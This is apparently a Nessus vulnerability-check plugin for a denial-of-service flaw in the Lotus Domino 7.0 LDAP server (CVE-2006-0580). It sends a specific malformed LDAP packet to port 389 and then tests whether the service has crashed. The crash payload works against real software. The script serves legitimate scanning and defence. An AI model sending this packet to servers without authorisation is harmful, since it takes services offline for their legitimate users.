#
# (C) Tenable Network Security, Inc.
#

# This flaw in Lotus Domino 7.0 was discovered by Evgeny Legerov and 
# published on the Dalily Dave mailing list
#
# References:
# From: "Evgeny Legerov" <admin@gleg.net>
# To: dailydave@lists.immunitysec.com
# Date: Sat, 04 Feb 2006 04:33:53 +0300
# Message-ID: <web-77782062@cgp.agava.net>
# Subject: [Dailydave] ProtoVer vs Lotus Domino Server 7.0
#


include("compat.inc");

if(description)
{
 script_id(20890);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2006-0580");
 script_bugtraq_id(16523);
 script_xref(name:"OSVDB", value:"55136");

 script_name(english:"Lotus Domino LDAP Server Crafted Packet Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote LDAP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The LDAP server on the remote host appears to have crashed after being
sent a malformed request.  The specific request used is known to crash
the LDAP server in Lotus Domino 7.0.  By leveraging this flaw, an
attacker may be able to deny service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://lists.immunitysec.com/pipermail/dailydave/2006-February/002896.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Sends a malformed request to the remote Lotus Domino LDAP server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencie("find_service1.nasl", "ldap_detect.nasl", "external_svc_ident.nasl");
 script_require_ports("Services/ldap", 389);
 exit(0);
}

#

port = get_kb_item("Services/ldap");
if ( ! port ) port = 389;

if (! get_port_state(port)) exit(0);

s = open_sock_tcp(port);
if (!s) exit(0);

send(socket: s, data: '\x30\x0c\x02\x01\x01\x60\x07\x02\x00\x03\x04\x00\x80\x00');
res = recv(socket:s, length:1024);
close(s);

if (res == NULL) {
  sleep(1);
  s = open_sock_tcp(port);
  if (s) close(s);
  else security_warning(port);
}

